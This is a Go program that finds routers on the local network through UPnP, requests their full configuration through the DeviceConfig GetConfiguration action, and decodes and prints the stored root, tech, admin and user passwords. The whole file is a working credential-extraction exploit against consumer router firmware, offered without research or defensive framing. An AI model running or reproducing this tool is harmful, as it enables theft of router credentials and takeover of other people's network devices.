package main

import (
	"github.com/huin/goupnp"
	"encoding/base64"
	"fmt"
	"log"
	"os"
)

type Root struct {
	NewConfigFile NewConfigFile
}

type NewConfigFile struct {
	DslCpeConfig DslCpeConfig
}

type DslCpeConfig struct {
	InternetGatewayDevice InternetGatewayDevice
}

type InternetGatewayDevice struct {
	LoginCfg LoginConfig `xml:"X_5067F0_LoginCfg"`
	Users    Users `xml:"X_5067F0_Users"`
}

type LoginConfig struct {
	AdminPassword string
	LoginGroup    []LoginGroup `xml:"X_5067F0_Login_Group"`
}

type Users struct {
	TechPassword string
	RootPassword string
}

type LoginGroup struct {
	LoginInfo []LoginInfo `xml:"Use_Login_Info"`
}

type LoginInfo struct {
	UserName string
	Password string
}

func main() {

	fmt.Println("Scanning for InternetGatewayDevice")

	devices, err := goupnp.DiscoverDevices("urn:dslforum-org:device:InternetGatewayDevice:1")
	if err != nil {
		panic(err)
	}

	if len(devices) == 0 {
		fmt.Println("No devices found. Are you connected to the same network as the router? (Maybe they changed the firmware version???)")
		os.Exit(1)
	}

	for _, v := range devices {

		fmt.Printf("Scanning: %s", v.Location)

		services := v.Root.Device.FindService("urn:dslforum-org:service:DeviceConfig:1")

		if len(services) == 0 {
			fmt.Println("DeviceConfig Service not found. Maybe they changed the firmware version?")
			os.Exit(1)
		}

		for _, s := range services {

			root := &Root{}
			soapClient := s.NewSOAPClient()
			if err := soapClient.PerformAction("urn:dslforum-org:service:DeviceConfig:1", "GetConfiguration", nil, root); err != nil {
				panic(err)
			}

			gw := root.NewConfigFile.DslCpeConfig.InternetGatewayDevice

			if gw.Users.RootPassword != "" {
				fmt.Printf("root: %s\n", decode(gw.Users.RootPassword))
			}

			if gw.Users.TechPassword != "" {
				fmt.Printf("tech: %s\n", decode(gw.Users.TechPassword))
			}

			if gw.LoginCfg.AdminPassword != "" {
				fmt.Printf("admin: %s\n", decode(gw.LoginCfg.AdminPassword))
			}

			for _, group := range gw.LoginCfg.LoginGroup {
				for _, login := range group.LoginInfo {
					if login.UserName != "" {
						fmt.Printf("%s: %s\n", login.UserName, decode(login.Password))
					}
				}
			}
		}
	}
}

func decode(str string) []byte {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		log.Panicf("Could not decode string: %s, err: %v", str, err)
	}
	return data
}
